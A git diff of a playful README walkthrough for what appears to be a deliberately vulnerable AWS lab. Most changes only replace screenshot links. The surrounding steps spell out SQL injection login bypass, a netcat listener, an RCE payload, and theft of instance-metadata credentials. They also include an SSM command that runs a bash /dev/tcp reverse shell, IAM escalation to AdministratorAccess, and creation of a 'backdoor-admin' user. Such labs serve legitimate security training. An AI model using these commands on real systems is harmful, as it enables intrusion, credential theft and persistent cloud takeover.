@@ -67,12 +67,12 @@ Once upon a time, in a land of misconfigured cloud environments, a daring securi
 ---
 
 ## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
-<img width="920" height="776" alt="image" src="https://github.com/user-attachments/assets/cede484f-1985-4043-a39a-2025eec6c66c" />
 
 Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
 ```sql
 ' or '1'='1' -- # Make sure to have space after the dashes
 ```
+<img width="914" height="770" alt="image" src="https://github.com/user-attachments/assets/7f9fc8ca-42e3-4cce-8cd5-cb6d0cb41b54" />
 
 Achievement unlocked! 🎮 Admin powers activated - let the real adventure begin!
 
@@ -87,13 +87,13 @@ First things first, adventurer - make sure your command center (reverse shell li
 ```bash
 nc -lvnp 4444
 ```
-<img width="625" height="237" alt="image" src="https://github.com/user-attachments/assets/3ce8b72e-9bb3-4d03-95c9-b1b721cecd25" />
+<img width="614" height="230" alt="image" src="https://github.com/user-attachments/assets/c7f3df13-8b00-4f02-9a5d-845e6201d0a1" />
 
 While that's running, grab the NAT address of the machine - you'll need it for the next phase of the challenge.
 
 Navigate to System Tools and then Bulk Employee Upload
 
-<img width="1965" height="1009" alt="image" src="https://github.com/user-attachments/assets/f4747571-23d6-46ea-8c4f-9c5840d09a2d" />
+<img width="1008" height="519" alt="image" src="https://github.com/user-attachments/assets/a7d6562a-8217-4f7f-9a4d-c119c9972d27" />
 
 
 Access the `examples/rce_exploit.json` file, update the `ATTACKER_IP` field with your listener’s IP address and the `REMOTE_PORT` field with the port you’ve configured, then insert the modified JSON into the Bulk Employee Upload function. After applying these changes, trigger the exploit payload to ensure the traffic is directed to your listener.
@@ -120,7 +120,7 @@ Access the `examples/rce_exploit.json` file, update the `ATTACKER_IP` field with
 ## 🚀 Step 3: Inside the Container!
 
 We’ve successfully landed in the container. 
-<img width="858" height="244" alt="image" src="https://github.com/user-attachments/assets/eba78865-cc42-4d41-9f5e-9e7a50111bce" />
+<img width="839" height="233" alt="image" src="https://github.com/user-attachments/assets/93412018-c9a9-4389-8590-67788709e636" />
 
 
 
@@ -139,7 +139,7 @@ sed -i 's/\r$//' get_token.sh
 chmod +x get_token.sh
 ./get_token.sh
 ```
-<img width="1060" height="1126" alt="image" src="https://github.com/user-attachments/assets/c4a8688e-968d-4680-b5fe-fb800063d9df" />
+<img width="1008" height="1059" alt="image" src="https://github.com/user-attachments/assets/49936a6b-62de-4d39-9218-b8edaec93ae7" />
 
 Now we got the tokens
 
@@ -160,9 +160,9 @@ export AWS_ACCESS_KEY_ID="..."
 export AWS_SECRET_ACCESS_KEY="..."
 export AWS_SESSION_TOKEN="..."
 ```
-<img width="1737" height="1259" alt="image" src="https://github.com/user-attachments/assets/5f68ff2a-f6a5-4cd4-8e42-5f77540aa40f" />
+<img width="1017" height="732" alt="image" src="https://github.com/user-attachments/assets/f2458142-f7e3-45bf-a810-053243262e25" />
 
-<img width="1534" height="342" alt="image" src="https://github.com/user-attachments/assets/e27d6875-146f-42ce-b51e-7c308c1e1c1b" />
+<img width="1010" height="203" alt="image" src="https://github.com/user-attachments/assets/02019977-4d5a-40df-b848-90923250aa3c" />
 
 
 ---
@@ -174,9 +174,8 @@ Now, let’s shift operations to our local machine:
 ```bash
 aws sts get-caller-identity
 ```
-<img width="1227" height="174" alt="image" src="https://github.com/user-attachments/assets/a2cf0c25-b17f-46f0-9d67-2da9dd7217b5" />
+<img width="1012" height="135" alt="image" src="https://github.com/user-attachments/assets/f4866093-17cb-4fd1-9410-c7448bdb6ae9" />
 
-![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)
 
 We have AWS credentials. Time to enumerate our permissions!
 
@@ -194,7 +193,7 @@ chmod +x aws-perm-check.sh
 ./aws-perm-check.sh
 ```
 
-<img width="1677" height="1127" alt="image" src="https://github.com/user-attachments/assets/603128d4-ca7b-4a5d-a8ec-668f0cba9726" />
+<img width="1677" height="1127" alt="image" src="https://github.com/user-attachments/assets/2cee8c78-2829-4a28-a751-03947ff9bd53" />
 
 
 We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!
@@ -207,10 +206,10 @@ To get an overview of your EC2 instances, you can run:
 ```bash
 aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
 ```
-<img width="1752" height="282" alt="image" src="https://github.com/user-attachments/assets/8de49a9e-6dc3-46fc-bbe5-074a9fae1b87" />
+<img width="1752" height="282" alt="image" src="https://github.com/user-attachments/assets/4859a002-7754-4fe4-98f8-5ad1761cf020" />
 
 If your environment uses a region other than us-east-1, you can enumerate all EC2 instances across every region using the script at `examples\check_aws_instances.sh`.
-<img width="1404" height="996" alt="image" src="https://github.com/user-attachments/assets/d7a602d6-ac9b-4aab-bd69-6ebf0a1cbeb7" />
+<img width="1007" height="715" alt="image" src="https://github.com/user-attachments/assets/9227e2fc-fd8d-443c-a757-91f3031ec906" />
 
 
 Once you identify an instance of interest, the next step is to gain access. You can either open a new listener on a different port or reuse a previous one. 
@@ -221,7 +220,7 @@ From your local terminal, run the following command, making sure to update the i
 ```bash
 aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0ef5488e604d5bd79" --parameters 'commands=["bash -c '\''bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1'\''"]' --region us-east-1
 ```
-<img width="1024" height="244" alt="image" src="https://github.com/user-attachments/assets/95c0b508-554e-4d64-a91f-269cf4486e19" />
+<img width="1024" height="244" alt="image" src="https://github.com/user-attachments/assets/0bb93239-cf70-4702-bbd9-66edd9385810" />
 
 Now we have a shell on a second machine. Time to escalate further!
 
@@ -240,31 +239,31 @@ CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/lat
 echo "$CREDS" | jq -r '. | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.Token)"'
 
 ```
-<img width="1184" height="596" alt="image" src="https://github.com/user-attachments/assets/682bda11-3eed-4efc-9911-6cf5e373541a" />
+<img width="690" height="210" alt="image" src="https://github.com/user-attachments/assets/75239ed1-aaa4-4c49-a9bb-92225e58e43f" />
 
 Fetch roles and credentials, and analyze the permissions with the previous script.
-<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/edd9c51e-f342-4a34-87a0-37e43caf14fa" />
+<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/6b3fb6fb-96f1-424c-972a-945e85fc32e0" />
 
 ---
 
 ## 🎯 Step 10: Escalating to Administrator
 
 We find that `hrgoat-jenkins-role` has IAM modification permissions. 
-<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/32cf8865-a1d5-4ea9-8ed1-6202bc1da743" />
+<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/f211a1ae-7386-4171-95f8-aa2bdb489d90" />
 
 
 Let’s exploit it, make sure to use the appropriate region:
 ```bash
 aws iam attach-role-policy --role-name 'hrgoat-jenkins-role-us-east-1' --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
 ```
-![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)
+<img width="940" height="199" alt="image" src="https://github.com/user-attachments/assets/05bd4edb-b1ad-4954-b99f-703e0ecbd902" />
 
 Check if it worked:
 ```bash
 aws iam list-attached-role-policies --role-name hrgoat-jenkins-role
 aws iam list-users
 ```
-![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)
+<img width="940" height="967" alt="image" src="https://github.com/user-attachments/assets/205f5f4f-29d6-4473-a3ee-e336b8ed7f5a" />
 
 We have admin rights! 🏆
 
@@ -280,13 +279,13 @@ aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::
 aws iam list-attached-user-policies --user-name backdoor-admin
 ```
 ### Create New User
-![image](https://github.com/user-attachments/assets/18bb0ec6-09a2-4c62-9bf2-3e5d48e5da1e)
+<img width="940" height="967" alt="image" src="https://github.com/user-attachments/assets/344d161b-4386-432d-84ec-547a2796a610" />
 
 ### Create User Access Key
-![image](https://github.com/user-attachments/assets/28029293-8b4e-4afe-b60d-cdc5b7c3b677)
+<img width="940" height="284" alt="image" src="https://github.com/user-attachments/assets/b6616430-6fed-409f-9329-538378d0b8d8" />
 
 ### Assign permissions and verify it worked
- ![image](https://github.com/user-attachments/assets/c53dc66b-333e-40e3-9af5-004cc4eab627)
+<img width="940" height="250" alt="image" src="https://github.com/user-attachments/assets/456e7e3d-3be4-48ec-b7e8-83e71f275422" />
 
 
 Success! Now, full control of the AWS environment is ours.
